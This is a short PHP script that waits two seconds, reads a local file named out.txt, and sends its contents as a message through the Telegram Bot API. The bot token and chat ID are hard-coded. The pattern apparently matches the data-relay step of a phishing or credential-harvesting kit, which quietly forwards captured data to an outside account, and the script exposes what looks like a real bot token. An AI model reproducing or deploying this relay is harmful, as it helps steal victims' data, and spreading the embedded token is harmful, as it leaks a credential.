<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot7054073278:AAGXFgQ8RUC2q4D1GXHh5hEYAVYUkgcuayU/sendMessage?chat_id=7311931997&text=$msg");
?>
